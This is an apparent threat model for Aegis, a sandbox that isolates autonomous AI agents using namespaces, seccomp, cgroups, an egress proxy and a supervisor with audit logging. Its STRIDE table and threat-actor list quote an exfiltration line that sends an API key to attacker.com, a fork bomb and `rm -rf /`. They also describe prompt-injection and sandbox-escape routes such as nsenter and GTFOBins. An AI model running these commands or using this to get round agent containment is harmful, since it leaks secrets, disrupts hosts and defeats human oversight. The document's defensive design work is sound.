# Aegis Security Threat Model

## 1. System Overview & Context

Aegis provides isolation boundaries and security enforcement mechanisms for autonomous AI agents (e.g., coding assistants, autonomous workflow runners, multi-agent frameworks). Unlike traditional deterministic applications, autonomous agents continuously receive untrusted external inputs (prompts, git repositories, documentation, web pages, tool outputs) and synthesize shell commands, file modifications, and network requests.

This threat model outlines the assets, trust boundaries, threat actors, attack scenarios, and explicit non-goals governing the Aegis architecture.

```
                    ┌────────────────────────────────────────────────────────┐
                    │               ZONE 0: UNTRUSTED SOURCES                │
                    │   Third-Party Repos, Web Scrapes, Tool Responses, PRDs │
                    └───────────────────────────┬────────────────────────────┘
                                                │ (Ingested as Prompt Context)
                                                ▼
┌────────────────────────────────────────────────────────────────────────────────────────────┐
│ ZONE 1: CONSTRAINED AGENT WORKSPACE                                                        │
│                                                                                            │
│   Autonomous AI Agent Process (LLM Runtime / Shell Worker)                                 │
│   - Receives Surrogate Tokens (e.g. aegis-surrogate-openai-...)                            │
│   - Runs under dropped privileges (UID 1001, unprivileged UserNS, or guest VM)             │
│                                                                                            │
│   Enforcement Perimeter (Zone 2):                                                          │
│   ├── Filesystem Wall: Read-only rootfs (`--ro-bind / /` or `--read-only`)                 │
│   ├── Syscall Wall: Seccomp BPF filter (blocks ptrace, bpf, mount, kexec, reboot)          │
│   ├── Resource Wall: Cgroup v2 (`memory.max`, `memory.swap.max`, `pids.max`)               │
│   └── Network Wall: Default-deny egress proxy + CONNECT filter                             │
└───────────────────────────────────────────────┬────────────────────────────────────────────┘
                                                │
                                                ▼ (Controlled Egress / Inspection)
┌────────────────────────────────────────────────────────────────────────────────────────────┐
│ ZONE 3: TRUSTED SUPERVISOR CONTROL PLANE                                                   │
│                                                                                            │
│   Supervisor Host / Hypervisor Daemon                                                      │
│   ├── Real Secret Vault (In-memory real keys: sk-live-...)                                 │
│   ├── Scoped Header Swapper (substitutes surrogate only on allowlisted hosts)              │
│   ├── Structured JSONL Audit Logger (records command lifecycle & security events)          │
│   └── Out-of-Band Terminator (`systemctl stop user-$UID.slice` or `virsh destroy`)         │
└────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Security Zones and Trust Boundaries

| Security Zone | Components | Trust Level | Boundary Mechanism |
| :--- | :--- | :--- | :--- |
| **Zone 0: External** | Web endpoints, untrusted git repositories, user-supplied prompt data | **Untrusted** | LLM parsing boundary & sanitizer |
| **Zone 1: Agent Workspace** | LLM worker process, child sub-agents, spawned bash shells | **Untrusted Execution** | Linux user namespaces, rootless OCI container, or hardware KVM VM |
| **Zone 2: Perimeter** | Seccomp BPF filters, cgroup controllers, bwrap mount table, egress proxy | **High Integrity** | Host kernel enforcement & container runtime |
| **Zone 3: Supervisor** | Out-of-band management session, secrets broker, audit engine, host OS | **Fully Trusted** | Host administrative root / hardware hypervisor |

---

## 3. Assets Under Protection

1. **Host Ring 0 Kernel Integrity**: Preventing privilege escalation from agent code execution to host root compromise.
2. **Persistent API and Cloud Credentials**: Ensuring production API tokens (`OPENAI_API_KEY`, cloud keys, SSH private keys) are never directly readable or exfiltratable by the agent.
3. **Host Filesystem Confidentiality and Integrity**: Guarding sensitive host state (`/etc/shadow`, `/root`, `/proc/1/environ`, Docker sockets).
4. **Host and Cluster Resource Availability**: Preventing denial-of-service via memory exhaustion, swap thrashing, or process table saturation (fork bombs).
5. **Network Perimeter Integrity**: Preventing the sandbox from serving as a pivoting point for lateral network movement, botnet participation, or cloud metadata service (IMDS) querying.

---

## 4. Threat Actor Profiles

* **TA-1: Errant Autonomous Agent (Accidental/Deterministic Flaw)**
  * *Capability*: Executes accidental destructive commands (`rm -rf /`, unbound recursive loops, unintended package installs).
  * *Motivation*: Hallucination or faulty planning logic.
* **TA-2: Indirect Prompt Injector (Adversarial External Input)**
  * *Capability*: Injects instructions via third-party markdown files, issue descriptions, poisoned git commits, or API responses.
  * *Objective*: Command execution, environment variable exfiltration via curl/wget, persistence creation via shell configuration files.
* **TA-3: Malicious In-Sandbox Adversary (Full Interactive Execution)**
  * *Capability*: Has achieved interactive arbitrary native execution inside the sandbox boundary.
  * *Objective*: Kernel vulnerability exploitation, container escape via mount manipulation, namespace hopping via `nsenter`/`systemd-run`, hypervisor gateway port scanning.

---

## 5. Threat Scenarios and Mitigations (STRIDE Matrix)

| STRIDE Category | Threat Scenario | Attack Vector | Aegis Defense Layer | Verification Method |
| :--- | :--- | :--- | :--- | :--- |
| **Spoofing** | Agent attempts to impersonate supervisor or another sandbox session. | Modifying UID, forging headers. | User namespaces map in-sandbox root to unprivileged host UID; surrogate tokens are unique per session. | `tests/test_backend_namespaces.py` |
| **Tampering** | Agent modifies system binaries or writes persistence scripts. | Writing to `/etc/bash.bashrc`, `/etc/shadow`, or `/usr/bin`. | Read-only root filesystem (`--ro-bind / /` or `--read-only`). `/tmp` mounted on ephemeral `tmpfs`. | `tests/test_controls.py` |
| **Repudiation** | Agent executes stealthy commands without operator awareness. | Unlogged subshells, background daemons. | Centralized JSONL audit logger capturing process invocations, exit codes, durations, and network egress attempts. | `tests/test_audit.py` |
| **Information Disclosure** | Prompt injection commands agent to dump `$OPENAI_API_KEY` to an external host. | `curl -d "$OPENAI_API_KEY" https://attacker.com` | Secrets broker provisions dummy surrogate token. Default-deny egress proxy drops connection to attacker host with `403 Forbidden`. | `tests/test_harness.py`, `tests/test_proxy.py` |
| **Denial of Service** | Fork bomb or runaway memory allocation attempts to hang host. | `:(){ :|:& };:`, unbounded byte allocations. | Cgroup v2 constraints (`pids.max=256`, `memory.max=450M`, `memory.swap.max=128M`). Deterministic `EAGAIN` and OOM reap. | `aegis stress`, `scripts/run_stress_tests.sh` |
| **Elevation of Privilege** | Living-off-the-land escape using sudo or binaries. | `sudo systemd-run`, `sudo nsenter`, GTFOBins binaries. | Hardened sudoers allowlist with explicit negations; automated GTFOBins scanner (`aegis scan`); dropped capabilities (`CAP_SYS_ADMIN`). | `tests/test_scanner.py`, `tests/test_seccomp.py` |

---

## 6. Explicit Non-Goals

1. **Hardware Side-Channel Attacks (Microarchitectural Exploits)**:
   Aegis does not provide software mitigations against microarchitectural side-channel attacks (e.g., Spectre, Meltdown, Rowhammer, MDS) executed across physical CPU execution threads. Mitigations must be provided at the CPU microcode and host hypervisor scheduler level (e.g., core scheduling).
2. **In-Line Semantic Inspection of Mutual TLS (mTLS)**:
   When an application negotiates end-to-end mTLS without trusting the proxy's certificate authority, the Aegis proxy operates as a domain-level layer-4 TCP CONNECT tunnel and cannot perform deep packet payload analysis beyond SNI / destination domain validation.
3. **Correcting High-Level Application Logic Errors**:
   Aegis is an execution isolation boundary, not an LLM guardrail. If an agent deletes a file within its designated, permitted workspace directory, Aegis permits the operation as long as it conforms to resource and security policies.
4. **Denial of Service Within the Agent's Own Slice**:
   If an agent crashes itself by consuming its allotted 450 MB RAM, the supervisor reaps the agent without affecting the host, but Aegis does not prevent the agent's internal process from terminating.
